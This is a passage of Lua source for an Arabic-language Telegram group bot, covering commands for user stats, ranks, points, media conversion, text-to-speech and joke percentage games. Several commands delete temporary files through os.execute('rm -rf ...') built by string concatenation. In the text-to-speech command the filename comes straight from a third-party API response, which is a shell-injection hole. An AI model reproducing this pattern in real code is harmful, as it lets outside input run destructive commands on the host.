uame = '@'..UserInfo.username
else
uame = 'لا يوجد'
end
sm = bot.getChatMember(msg.chat_id,Remsg.sender.user_id)
if sm.status.luatele == "chatMemberStatusCreator"  then
gstatus = "المالك الاساسي"
elseif sm.status.luatele == "chatMemberStatusAdministrator" then
gstatus = "مشرف"
else
gstatus = "عضو"
end
bot.sendText(msg.chat_id,msg.id,"*iD ↦ *"..(Remsg.sender.user_id).." **\n*uSeR ↦ *["..(uame).."] **\n*Rank ↦ *"..(Get_Rank(Remsg.sender.user_id,msg.chat_id)).." **\n*RanGr ↦ *"..(gstatus).." **\n*Msg ↦ *"..(redis:get(bot_id..":"..msg.chat_id..":"..Remsg.sender.user_id..":message") or 1).." **" ,"md",true)  
end
if text and text:match('^كشف (%d+)$') or text and text:match('^ايدي (%d+)$') then
local UserName = text:match('^كشف (%d+)$') or text:match('^ايدي (%d+)$')
local UserInfo = bot.getUser(UserName)
if UserInfo.code == 400 or UserInfo.message == "Invalid user ID" then
return false
end
if UserInfo.username and UserInfo.username ~= "" then
uame = '@'..UserInfo.username
else
uame = 'لا يوجد'
end
sm = bot.getChatMember(msg.chat_id,UserName)
if sm.status.luatele == "chatMemberStatusCreator"  then
gstatus = "المالك الاساسي"
elseif sm.status.luatele == "chatMemberStatusAdministrator" then
gstatus = "مشرف"
else
gstatus = "عضو"
end
bot.sendText(msg.chat_id,msg.id,"*iD ↦ *"..(UserName).." **\n*uSeR ↦ *["..(uame).."]**\n*Rank ↦ *"..(Get_Rank(UserName,msg.chat_id)).." **\n*RanGr ↦ *"..(gstatus).." **\n*Msg ↦ *"..(redis:get(bot_id..":"..msg.chat_id..":"..UserName..":message") or 1).." **" ,"md",true)  
end
if text == 'اوامر المسح' then
local reply_markup = bot.replyMarkup{
type = 'inline',
data = {
{{text = '↯ مسح رسائلي',data="delforme_"..msg.sender.user_id.."_1"}},
{{text ="↯ مسح سحكاتي",data="delforme_"..msg.sender.user_id.."_2"}},
{{text = '↯ مسح جهاتي',data="delforme_"..msg.sender.user_id.."_3"}},
{{text ="↯ مسح نقاطي",data="delforme_"..msg.sender.user_id.."_4"}},
}
}
bot.sendText(msg.chat_id,msg.id,'*↯︙اهلا بك بأوامر المسح اضغط على الزر لحذفهن*',"md", true, false, false, false, reply_markup)
end
if text == 'ترجمه' or text == 'ترجمة' or text == 'ترجم' or text == 'translat' then 
local reply_markup = bot.replyMarkup{
type = 'inline',
data = {
{{text = 'ترجمه الي العربية', data = msg.sender.user_id..'toar'},{text = 'ترجمه الي الانجليزية', data = msg.sender.user_id..'toen'}},
{{text = ' ❍ 𝑆𝑂𝑈𝑅𝐶𝐸 𝐵𝐿𝐴𝐶𝐾 ❍️', url = "https://t.me/J_F_A_I"}},
}
}
bot.sendText(msg.chat_id,msg.id, [[*
• Hey Send Text translate
• ارسل النص لترجمته
*]],"md",false, false, false, false, reply_markup)
end
if text == ("احصائياتي") and tonumber(msg.reply_to_message_id) == 0 then  
local nummsg = redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":message") or 1
local edit = redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":Editmessage")or 0
local addmem = redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":Addedmem") or 0
local Num = redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":game") or 0
local reply_markup = bot.replyMarkup{
type = 'inline',
data = {
{{text = '↯ الرسائل',data="iforme_"..msg.sender.user_id.."_1"},{text ="( "..nummsg.." )",data="iforme_"..msg.sender.user_id.."_1"}},
{{text = '↯ السحكات',data="iforme_"..msg.sender.user_id.."_2"},{text ="( "..edit.." )",data="iforme_"..msg.sender.user_id.."_2"}},
{{text = '↯ الجهات',data="iforme_"..msg.sender.user_id.."_3"},{text ="( "..addmem.." )",data="iforme_"..msg.sender.user_id.."_3"}},
{{text = '↯ المجوهرات',data="iforme_"..msg.sender.user_id.."_4"},{text ="( "..Num.." )",data="iforme_"..msg.sender.user_id.."_4"}},
}
}
bot.sendText(msg.chat_id,msg.id,"*↯︙اهلا بك احصائياتك هي ⬇️ .*","md", true, false, false, false, reply_markup)
return false
end

if text == 'رتبتي' then
bot.sendText(msg.chat_id,msg.id,"*رتبتك ↤ *"..(Get_Rank(msg.sender.user_id,msg.chat_id)).." **","md",true)  
return false
end
if text == 'سحكاتي' or text == 'تعديلاتي' then
bot.sendText(msg.chat_id,msg.id,"*• عدد تعديلاتك ↤ *"..(redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":Editmessage") or 0).." **","md",true)  
return false
end
if text == 'مسح سحكاتي' or text == 'مسح تعديلاتي' then
bot.sendText(msg.chat_id,msg.id,'*• تم مسح جميع تعديلاتك*',"md",true)   
redis:del(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":Editmessage")
return false
end
if text == 'جهاتي' or text == 'اضافاتي' then
bot.sendText(msg.chat_id,msg.id,"*• عدد جهاتك ↤ *"..(redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":Addedmem") or 0).." **","md",true)  
return false
end
if text == 'تفاعلي' or text == 'نشاطي' then
bot.sendText(msg.chat_id,msg.id,"*"..Total_message((redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":message") or 1)).."*","md",true)  
return false
end
if text ==("مسح") and Administrator(msg) and tonumber(msg.reply_to_message_id) > 0 then
if GetInfoBot(msg).Delmsg == false then
bot.sendText(msg.chat_id,msg.id,'*• ليس لدي صلاحيه مسح الرسائل*',"md",true)  
return false
end
bot.deleteMessages(msg.chat_id,{[1]= msg.reply_to_message_id})
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
end   
if text == 'مسح جهاتي' or text == 'مسح اضافاتي' then
bot.sendText(msg.chat_id,msg.id,'*• تم مسح جميع جهاتك*',"md",true)   
redis:del(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":Addedmem")
return false
end
if text == "منو ضافني" or text == "مين ضافني" or text == "من ضافني" or text == "مين دخلني" or text == "من دخلني" or text == "منو دخلني" then
if not redis:get(bot_id.."Abs:Addme:Abs"..msg.chat_id) then
return bot.sendText(msg.chat_id,msg.id," • مين ضافني مقفلة من قبل المشرفين","md",true)
end
if bot.getChatMember(msg.chat_id,msg.sender.user_id).status.luatele == "chatMemberStatusCreator" then
bot.sendText(msg.chat_id,msg.id,"*↯︙انتا المالك الاساسي 😂*","md",true) 
return false
end
addby = redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":AddedMe")
if addby then 
UserInfo = bot.getUser(addby)
Name = '['..UserInfo.first_name..'](tg://user?id='..addby..')'
bot.sendText(msg.chat_id,msg.id,"*هذا يلي ضافك ↤ *"..(Name).." **","md",true)  
else
bot.sendText(msg.chat_id,msg.id,"*↯︙محد ضافك انتا دخلت*","md",true) 
return false
end
end
redis:incr(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":message") 
if text == 'رسائلي' or text == 'رسايلي' then
bot.sendText(msg.chat_id,msg.id,"*• عدد رسائلك ↤ *"..(redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":message") or 1).." **","md",true)  
return false
end
if text == 'مسح رسائلي' or text == 'مسح رسايلي' then
bot.sendText(msg.chat_id,msg.id,'*↯︙تم مسحت كل رسائلك*',"md",true)   
redis:del(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":message")
return false
end
if text == 'نقاطي' then
bot.sendText(msg.chat_id,msg.id,"*• عدد نقاطك ↤ *"..(redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":game") or 0).." **","md",true)  
return false
end

if text and text:match("^اضف نقاط (%d+)$") and msg.reply_to_message_id ~= 0 and redis:get(bot_id.."Status:Games"..msg.chat_id) then
if not Constructor(msg) then
return bot.sendText(msg.chat_id,msg.id,'\n*• هذا الامر يخص المنشئ ومافوق* ',"md",true)  
end
local Message_Reply = bot.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = bot.getUser(Message_Reply.sender.user_id)
if UserInfo.message == "Invalid user ID" then
return bot.sendText(msg.chat_id,msg.id,"\n• عذراً تستطيع فقط استخدام الامر على المستخدمين ","md",true)  
end
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
return bot.sendText(msg.chat_id,msg.id,"\n• عذراً لا تستطيع استخدام الامر على البوت ","md",true)  
end
redis:incrby(bot_id..":"..msg.chat_id..":"..Message_Reply.sender.user_id..":game", text:match("^اضف نقاط (%d+)$"))
return bot.sendText(msg.chat_id,msg.id,Reply_Status(Message_Reply.sender.user_id,"• تم اضافه له ( "..text:match("^اضف نقاط (%d+)$").." ) من النقاط").helo,"md",true)  
end
if text and text:match("^اضف تعديلات (%d+)$") and msg.reply_to_message_id ~= 0 and redis:get(bot_id.."Status:Games"..msg.chat_id) then
if not Constructor(msg) then
return bot.sendText(msg.chat_id,msg.id,'\n*• هذا الامر يخص المنشئ ومافوق* ',"md",true)  
end
local Message_Reply = bot.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = bot.getUser(Message_Reply.sender.user_id)
if UserInfo.message == "Invalid user ID" then
return bot.sendText(msg.chat_id,msg.id,"\n• عذراً تستطيع فقط استخدام الامر على المستخدمين ","md",true)  
end
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
return bot.sendText(msg.chat_id,msg.id,"\n• عذراً لا تستطيع استخدام الامر على البوت ","md",true)  
end
redis:incrby(bot_id..":"..msg.chat_id..":"..Message_Reply.sender.user_id..":Editmessage", text:match("^اضف تعديلات (%d+)$"))  
return bot.sendText(msg.chat_id,msg.id,Reply_Status(Message_Reply.sender.user_id,"• تم اضافه له ( "..text:match("^اضف تعديلات (%d+)$").." ) من تعديلات").helo,"md",true)  
end
if text and text:match("^اضف رسائل (%d+)$") and msg.reply_to_message_id ~= 0 and redis:get(bot_id.."Status:Games"..msg.chat_id) then
if not Constructor(msg) then
return bot.sendText(msg.chat_id,msg.id,'\n*• هذا الامر يخص المنشئ ومافوق* ',"md",true)  
end
local Message_Reply = bot.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = bot.getUser(Message_Reply.sender.user_id)
if UserInfo.message == "Invalid user ID" then
return bot.sendText(msg.chat_id,msg.id,"\n• عذراً تستطيع فقط استخدام الامر على المستخدمين ","md",true)  
end
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
return bot.sendText(msg.chat_id,msg.id,"\n• عذراً لا تستطيع استخدام الامر على البوت ","md",true)  
end
redis:incrby(bot_id..":"..msg.chat_id..":"..Message_Reply.sender.user_id..":message", text:match("^اضف رسائل (%d+)$"))    
return bot.sendText(msg.chat_id,msg.id,Reply_Status(Message_Reply.sender.user_id,"• تم اضافه له ( "..text:match("^اضف رسائل (%d+)$").." ) من الرسائل").helo,"md",true)  
end
if text and text:match("^اضف رسايل (%d+)$") and msg.reply_to_message_id ~= 0 and redis:get(bot_id.."Status:Games"..msg.chat_id) then
if not Constructor(msg) then
return bot.sendText(msg.chat_id,msg.id,'\n*• هذا الامر يخص المنشئ ومافوق* ',"md",true)  
end
local Message_Reply = bot.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = bot.getUser(Message_Reply.sender.user_id)
if UserInfo.message == "Invalid user ID" then
return bot.sendText(msg.chat_id,msg.id,"\n• عذراً تستطيع فقط استخدام الامر على المستخدمين ","md",true)  
end
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
return bot.sendText(msg.chat_id,msg.id,"\n• عذراً لا تستطيع استخدام الامر على البوت ","md",true)  
end
redis:incrby(bot_id..":"..msg.chat_id..":"..Message_Reply.sender.user_id..":message", text:match("^اضف رسايل (%d+)$"))    
return bot.sendText(msg.chat_id,msg.id,Reply_Status(Message_Reply.sender.user_id,"• تم اضافه له ( "..text:match("^اضف رسايل (%d+)$").." ) من الرسائل").helo,"md",true)  
end
if text and text:match("^بيع نقاطي (%d+)$") then  
local end_n = text:match("^بيع نقاطي (%d+)$")
if tonumber(end_n) == tonumber(0) then
bot.sendText(msg.chat_id,msg.id,"*• لا استطيع بيع اقل من 1*","md",true)  
return false 
end
if tonumber(redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":game")) == tonumber(0) then
bot.sendText(msg.chat_id,msg.id,"*• ليس لديك نقاط من الالعاب \n• اذا كنت تريد ربح النقاط \n• ارسل الالعاب وابدأ العب *","md",true)  
else
local nb = redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":game")
if tonumber(end_n) > tonumber(nb) then
bot.sendText(msg.chat_id,msg.id,"*• ليس لديك نقاط بهذا العدد \n• لزيادة نقاطك \n• ارسل الالعاب وابدأ العب*","md",true)  
return false
end
local end_d = string.match((end_n * 50), "(%d+)") 
bot.sendText(msg.chat_id,msg.id,"*• بعت* *~ ( "..end_n.." )* *من نقاطك* \n*• واضفتلك* *~ ( "..end_d.." )* *رسالة*","md",true)  
redis:decrby(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":game",end_n)  
redis:incrby(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":message",end_d)  
end
return false 
end
if text == 'مسح نقاطي' then
bot.sendText(msg.chat_id,msg.id,'*↯︙تم مسحت كل نقاطك*',"md",true)   
redis:del(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":game")
return false
end
if text == 'ايديي' then
bot.sendText(msg.chat_id,msg.id,"*"..msg.sender.user_id.." *","md",true)  
return false
end
if text == 'اسمي' then
bot.sendText(msg.chat_id,msg.id,"*"..bot.getUser(msg.sender.user_id).first_name.." *","md",true)  
return false
end
if text == 'ملصق' and tonumber(msg.reply_to_message_id) > 0 then
local data = bot.getMessage(msg.chat_id, msg.reply_to_message_id)
if data.content.photo then
if data.content.photo.sizes[1].photo.remote.id then
idPhoto = data.content.photo.sizes[1].photo.remote.id
elseif data.content.photo.sizes[2].photo.remote.id then
idPhoto = data.content.photo.sizes[2].photo.remote.id
elseif data.content.photo.sizes[3].photo.remote.id then
idPhoto = data.content.photo.sizes[3].photo.remote.id
end
local File = json:decode(https.request('https://api.telegram.org/bot' .. Token .. '/getfile?file_id='..idPhoto) ) 
local Name_File = download('https://api.telegram.org/file/bot'..Token..'/'..File.result.file_path, './'..msg.id..'.webp') 
bot.sendSticker(msg.chat_id, msg.id, Name_File)
os.execute('rm -rf '..Name_File) 
else
bot.sendText(msg.chat_id,msg.id,'• هذه ليست صورة')
end
end
if text == 'صوره' and tonumber(msg.reply_to_message_id) > 0 then
local data = bot.getMessage(msg.chat_id, msg.reply_to_message_id)
if data.content.sticker then    
local File = json:decode(https.request('https://api.telegram.org/bot' .. Token .. '/getfile?file_id='..data.content.sticker.sticker.remote.id) ) 
local Name_File = download('https://api.telegram.org/file/bot'..Token..'/'..File.result.file_path, './'..msg.id..'.jpg') 
bot.sendPhoto(msg.chat_id, msg.id, Name_File,'')
os.execute('rm -rf '..Name_File) 
else
bot.sendText(msg.chat_id,msg.id,'• هذا ليس ملصق')
end
end
if text == 'بصمه' and tonumber(msg.reply_to_message_id) > 0 then
local data = bot.getMessage(msg.chat_id, msg.reply_to_message_id)
if data.content.audio then    
local File = json:decode(https.request('https://api.telegram.org/bot' .. Token .. '/getfile?file_id='..data.content.audio.audio.remote.id) ) 
local Name_File = download('https://api.telegram.org/file/bot'..Token..'/'..File.result.file_path, './'..msg.id..'.ogg') 
bot.sendVoiceNote(msg.chat_id, msg.id, Name_File, '', 'md')
os.execute('rm -rf '..Name_File) 
else
bot.sendText(msg.chat_id,msg.id,'• هذا ليس ملف صوتي')
end
end
if text == 'صوت' and tonumber(msg.reply_to_message_id) > 0 then
local data = bot.getMessage(msg.chat_id, msg.reply_to_message_id)
if data.content.voice_note then
local File = json:decode(https.request('https://api.telegram.org/bot' .. Token .. '/getfile?file_id='..data.content.voice_note.voice.remote.id) ) 
local Name_File = download('https://api.telegram.org/file/bot'..Token..'/'..File.result.file_path, msg.id..'.mp3') 
bot.sendAudio(msg.chat_id, msg.id, Name_File, '', "md") 
os.execute('rm -rf '..Name_File) 
else
bot.sendText(msg.chat_id,msg.id,' • هذا ليس بصمه')
end
end
if text == 'mp3' and tonumber(msg.reply_to_message_id) > 0 then
local data = bot.getMessage(msg.chat_id, msg.reply_to_message_id)
if data.content.video then
local File = json:decode(https.request('https://api.telegram.org/bot' .. Token .. '/getfile?file_id='..data.content.video.video.remote.id) ) 
local Name_File = download('https://api.telegram.org/file/bot'..Token..'/'..File.result.file_path, msg.id..'.mp3') 
return bot.sendAudio(msg.chat_id, msg.id, Name_File, '', "md") 
--os.execute('rm -rf '..Name_File) 
else
bot.sendText(msg.chat_id,msg.id,'• هذا ليس فيديو')
end
end
if text == 'متحركه' and tonumber(msg.reply_to_message_id) > 0 then
local data = bot.getMessage(msg.chat_id, msg.reply_to_message_id)
if data.content.video then
local File = json:decode(https.request('https://api.telegram.org/bot' .. Token .. '/getfile?file_id='..data.content.video.video.remote.id) ) 
local Name_File = download('https://api.telegram.org/file/bot'..Token..'/'..File.result.file_path, msg.id..'.gif.mp4') 
bot.sendAnimation(msg.chat_id,msg.id, Name_File, '', 'md')
--os.execute('rm -rf '..Name_File) 
else
bot.sendText(msg.chat_id,msg.id,'• هذا ليس فيديو')
end
end

if text and text:match("^انطق (.*)$") then
local UrlAntk = https.request('https://apiabs.ml/Antk.php?abs='..URL.escape(text:match("^انطق (.*)$")))
Antk = JSON.decode(UrlAntk)
if UrlAntk.ok ~= false then
uuu = download("https://translate"..Antk.result.google..Antk.result.code.."UTF-8"..Antk.result.utf..Antk.result.translate.."&tl=ar-IN",'./'..Antk.result.translate..'.mp3') 
bot.sendAudio(msg.chat_id, msg.id, uuu) 
os.execute('rm -rf ./'..Antk.result.translate..'.mp3') 
end
end

if text == "نسبه الحب" or text == "نسبه حب" and msg.reply_to_message_id ~= 0 then
if not redis:get(bot_id.."nsab"..msg.chat_id) then
return bot.sendText(msg.chat_id,msg.id," • اوامر النسب معطلة من قبل المشرفين","md",true)
end
redis:set(bot_id..":"..msg.sender.user_id..":lov_Bots"..msg.chat_id,"sendlove")
hggg = '• الان ارسل اسمك واسم الشخص الثاني'
bot.sendText(msg.chat_id,msg.id,hggg) 
return false
end

if text == "جمالي" or text == 'نسبه جمالي' then
if not redis:get(bot_id.."nsab"..msg.chat_id) then
return bot.sendText(msg.chat_id,msg.id," • اوامر النسب معطلة من قبل المشرفين","md",true)
end
local photo = bot.getUserProfilePhotos(msg.sender.user_id)
if developer(msg) then
if photo.total_count > 0 then
return bot.sendPhoto(msg.chat_id, msg.id, photo.photos[1].sizes[#photo.photos[1].sizes].photo.remote.id,"*اجمل مطور شفته بحياتي ❤*", "md")
else
return bot.sendText(msg.chat_id,msg.id,'*• لا توجد صوره في حسابك •*',"md",true) 
end
else
if photo.total_count > 0 then
local nspp = {"10","20","30","35","75","34","66","82","23","19","55","80","63","32","27","89","99","98","79","100","8","3","6","0",}
local rdbhoto = nspp[math.random(#nspp)]
return bot.sendPhoto(msg.chat_id, msg.id, photo.photos[1].sizes[#photo.photos[1].sizes].photo.remote.id,"*نسبة جمالك هي "..rdbhoto.."% *", "md")
else
return bot.sendText(msg.chat_id,msg.id,'*• لا توجد صوره في حسابك  •*',"md",true) 
end
end
end
if text == "نسبه الغباء" or text == "نسبه الغباء" and msg.reply_to_message_id ~= 0 then
if not redis:get(bot_id.."nsab"..msg.chat_id) then
return bot.sendText(msg.chat_id,msg.id," • اوامر النسب معطلة من قبل المشرفين","md",true)
end
redis:set(bot_id..":"..msg.sender.user_id..":lov_Bottts"..msg.chat_id,"sendlove")
hggg = '• الان ارسل اسم الشخص '
bot.sendText(msg.chat_id,msg.id,hggg) 
return false
end
if text == "نسبه الذكاء" or text == "نسبه الذكاء" and msg.reply_to_message_id ~= 0 then
if not redis:get(bot_id.."nsab"..msg.chat_id) then
return bot.sendText(msg.chat_id,msg.id," • اوامر النسب معطلة من قبل المشرفين","md",true)
end
redis:set(bot_id..":"..msg.sender.user_id..":lov_Botttuus"..msg.chat_id,"sendlove")
hggg = '• الان ارسل اسم الشخص '
bot.sendText(msg.chat_id,msg.id,hggg) 
return false
end
if text == "نسبه الكره" or text == "نسبه كره" and msg.reply_to_message_id ~= 0 then
if not redis:get(bot_id.."nsab"..msg.chat_id) then
return bot.sendText(msg.chat_id,msg.id," • اوامر النسب معطلة من قبل المشرفين","md",true)
end
redis:set(bot_id..":"..msg.sender.user_id..":krh_Bots"..msg.chat_id,"sendkrhe")
hggg = '• الان ارسل اسمك واسم الشخص الثاني '
bot.sendText(msg.chat_id,msg.id,hggg) 
return false
end
if text == "نسبه الرجوله" or text == "نسبه الرجولة" and msg.reply_to_message_id ~= 0 then
if not redis:get(bot_id.."nsab"..msg.chat_id) then
return bot.sendText(msg.chat_id,msg.id," • اوامر النسب معطلة من قبل المشرفين","md",true)
end
redis:set(bot_id..":"..msg.sender.user_id..":rjo_Bots"..msg.chat_id,"sendrjoe")
hggg = '• الان ارسل اسم الشخص :'
bot.sendText(msg.chat_id,msg.id,hggg) 
return false
end
if text == "نسبه الانوثه" or text == "نسبه انوثه" and msg.reply_to_message_id ~= 0 then
if not redis:get(bot_id.."nsab"..msg.chat_id) then
return bot.sendText(msg.chat_id,msg.id," • اوامر النسب معطلة من قبل المشرفين","md",true)
end
redis:set(bot_id..":"..msg.sender.user_id..":ano_Bots"..msg.chat_id,"sendanoe")
hggg = '• الان ارسل اسم الشخص :'
bot.sendText(msg.chat_id,msg.id,hggg) 
return false
end
if text == "اسمي"  then
local ban = bot.getUser(msg.sender.user_id)
if ban.first_name then
news = " `"..ban.first_name.."` "
else
news = " لا يوجد"
end
return bot.sendText(msg.chat_id,msg.id,news,"md",true) 
end
if text == "معرفي" or text == "يوزري" then
local ban = bot.getUser(msg.sender.user_id)
if ban.username then
banusername = '[@'..ban.username..']'
else
banusername = 'لا يوجد لديك يوزر'
end
return bot.sendText(msg.chat_id,msg.id,banusername,"md",true) 
end

if text == 'نادي المطور' or text == 'بدي مساعدة' or text == 'بدي مساعده' then  

bot.sendText(msg.chat_id,msg.id,"• تم إرسال طلبك للمطور سيتم الرد عليك قريباً .")
local Get_Chat = bot.getChat(msg.chat_id)
local Info_Chats = bot.getSupergroupFullInfo(msg.chat_id)
local bains = bot.getUser(msg.sender.user_id)
if bains.first_name then
klajq = '*['..bains.first_name..'](tg://user?id='..bains.id..')*'
else
klajq = 'لا يوجد'
end
if bains.username then
basgk = ''..bains.username..' '
else
basgk = 'لا يوجد'
end
local czczh = ''..bains.first_name..''
local reply_markup = bot.replyMarkup{
type = 'inline',
data = {
{
{text = czczh, url = "https://t.me/"..bains.username..""},
},
{
{text = Get_Chat.title, url = Info_Chats.invite_link.invite_link}, 
},
}
}
bot.sendText(sudoid,0,'*\n• مرحباً عزيزي المطور \nشخص ما يحتاج مساعدتك\n━━━━━━━━\n• اسمه : '..klajq..' \n• ايديه : '..msg.sender.user_id..'\n• يوزره : @'..basgk..'\n• الوقت : '..os.date("%I:%M %p")..'\n• التاريخ : '..os.date("%Y/%m/%d")..'*',"md",false, false, false, false, reply_markup)
end

if text == "صورتي" or text == "افتاري" then
if not redis:get(bot_id.."aftare"..msg.chat_id) then
return bot.sendText(msg.chat_id,msg.id," • افتاري معطلة من قبل المشرفين","md",true)
end
local photo = bot.getUserProfilePhotos(msg.sender.user_id)
local ban = bot.getUser(msg.sender.user_id)
local ban_ns = ''
if photo.total_count > 0 then
data = {} 
data.inline_keyboard = {
{
{text = '• اخفاء الامر •', callback_data = msg.sender.user_id..'/delAmr'}, 
},
{
{text = '• الصورة التالية •', callback_data= msg.sender.user_id..'/ban1'}, 
},
}
local msgg = msg.id/2097152/0.5
https.request("https://api.telegram.org/bot"..Token.."/sendphoto?chat_id=" .. msg.chat_id .. "&photo="..photo.photos[1].sizes[#photo.photos[1].sizes].photo.remote.id.."&caption=".. URL.escape(ban_ns).."&reply_to_message_id="..msgg.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(data))
end
end
if text and text:match('^ضع رتبه @(%S+) (.*)$') then
if not redis:get(bot_id.."redis:setRt"..msg.chat_id) then
return bot.sendText(msg.chat_id,msg.id," • ضع رتبه معطلة من قبل المشرفين","md",true)
end
if text:match("مطور اساسي") or text:match("المطور الاساسي") or text:match("مطور الاساسي") or text:match("ثانوي") or text:match("مطور") then
return bot.sendText(msg.chat_id,msg.id," • خطأ ، اختر رتبة اخرى ","md",true)
end
if not Administrator(msg) then
return bot.sendText(msg.chat_id,msg.id,'\n*• هذا الامر يخص الادمن * ',"md",true)  
end
local UserName = {text:match('^ضع رتبه @(%S+) (.*)$')}
local UserId_Info = bot.searchPublicChat(UserName[1])
if not UserId_Info.id then
return bot.sendText(msg.chat_id,msg.id,"\n• عذراً لا يوجد حساب بهذا المعرف ","md",true)  
end
if UserId_Info.type.is_channel == true then
return bot.sendText(msg.chat_id,msg.id,"\n• عذراً لا تستطيع استخدام معرف قناة او المجموعه ","md",true)  
end
if UserName[1] and UserName[1]:match('(%S+)[Bb][Oo][Tt]') then
return bot.sendText(msg.chat_id,msg.id,"\n• عذراً لا تستطيع استخدام معرف البوت ","md",true)  
end
redis:set(bot_id..':SetRt'..msg.chat_id..':'..UserId_Info.id,UserName[2])
return bot.sendText(msg.chat_id,msg.id,"\n• وضعتله رتبه : "..UserName[2],"md",true)  
end
if text and text:match('^ضع رتبه (.*)$') and msg.reply_to_message_id ~= 0 then
if not redis:get(bot_id.."redis:setRt"..msg.chat_id) then
return bot.sendText(msg.chat_id,msg.id," • ضع رتبه معطلة من قبل المشرفين","md",true)
end
if text:match("مطور اساسي") or text:match("المطور الاساسي") or text:match("مطور الاساسي") or text:match("ثانوي") or text:match("مطور") then
return bot.sendText(msg.chat_id,msg.id," • خطأ ، اختر رتبة اخرى ","md",true)
end
if not Administrator(msg) then
return bot.sendText(msg.chat_id,msg.id,'\n*• هذا الامر يخص الادمن * ',"md",true)  
end
local Message_Reply = bot.getMessage(msg.chat_id, msg.reply_to_message_id)
redis:set(bot_id..':SetRt'..msg.chat_id..':'..Message_Reply.sender.user_id,text:match('^ضع رتبه (.*)$'))
return bot.sendText(msg.chat_id,msg.id,"\n• وضعتله رتبه : "..text:match('^ضع رتبه (.*)$'),"md",true)  
end
if text and text:match('^مسح رتبه @(%S+)$') then
if not redis:get(bot_id.."redis:setRt"..msg.chat_id) then
return bot.sendText(msg.chat_id,msg.id," • ضع رتبه معطلة من قبل المشرفين","md",true)
end
if text:match("مطور اساسي") or text:match("المطور الاساسي") or text:match("مطور الاساسي") or text:match("ثانوي") or text:match("مطور") then
return bot.sendText(msg.chat_id,msg.id," • خطأ ، اختر رتبة اخرى ","md",true)
end
if not Administrator(msg) then
return bot.sendText(msg.chat_id,msg.id,'\n*• هذا الامر يخص الادمن * ',"md",true)  
end
local UserName = text:match('^مسح رتبه @(%S+)$')
local UserId_Info = bot.searchPublicChat(UserName)
if not UserId_Info.id then
return bot.sendText(msg.chat_id,msg.id,"\n• عذراً لا يوجد حساب بهذا المعرف ","md",true)  
end
if UserId_Info.type.is_channel == true then
return bot.sendText(msg.chat_id,msg.id,"\n• عذراً لا تستطيع استخدام معرف قناة او المجموعه ","md",true)  
end
if UserName and UserName:match('(%S+)[Bb][Oo][Tt]') then
return bot.sendText(msg.chat_id,msg.id,"\n• عذراً لا تستطيع استخدام معرف البوت ","md",true)  
end
redis:del(bot_id..':SetRt'..msg.chat_id..':'..UserId_Info.id)
return bot.sendText(msg.chat_id,msg.id,"\n• مسحت رتبته","md",true)  
end
if text and text:match('^مسح رتبه$') and msg.reply_to_message_id ~= 0 then
if not redis:get(bot_id.."redis:setRt"..msg.chat_id) then
return bot.sendText(msg.chat_id,msg.id," • ضع رتبه معطلة من قبل المشرفين","md",true)
end
if text:match("مطور اساسي") or text:match("المطور الاساسي") or text:match("مطور الاساسي") or text:match("ثانوي") or text:match("مطور") then
return bot.sendText(msg.chat_id,msg.id," • خطأ ، اختر رتبة اخرى ","md",true)
end
if not Administrator(msg) then
return bot.sendText(msg.chat_id,msg.id,'\n*• هذا الامر يخص الادمن * ',"md",true)  
end
local Message_Reply = bot.getMessage(msg.chat_id, msg.reply_to_message_id)
redis:del(bot_id..':SetRt'..msg.chat_id..':'..Message_Reply.sender.user_id)
return bot.sendText(msg.chat_id,msg.id,"\n• مسحت رتبته ","md",true)  
end

if text == "شبيهي" then

if not redis:get(bot_id.."shapeh"..msg.chat_id) then
return bot.sendText(msg.chat_id,msg.id," • شبيهي معطل من قبل المشرفين","md",true)
end
Abs = math.random(2,140); 
local Text ='*الصراحه اتفق هذا شبيهك .*'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '‹ ‹ TeAm MeLaNo  ›  ›', url = "https://t.me/QQOQQD"}
},
}
local msg_id = msg.id/2097152/0.5
https.request("https://api.telegram.org/bot"..Token..'/sendphoto?chat_id=' .. msg.chat_id .. '&photo=https://t.me/VVVVBV1V/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end

if text == "شبيهتي" then

if not redis:get(bot_id.."shapeh"..msg.chat_id) then
return bot.sendText(msg.chat_id,msg.id," • شبيهتي معطل من قبل المشرفين","md",true)
end
Abs = math.random(2,140); 
local Text ='*الصراحه اتفق هذي شبيهتك .*'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '‹ ‹ TeAm MeLaNo  ›  ›', url = "https://t.me/QQOQQD"}
},
}
local msg_id = msg.id/2097152/0.5
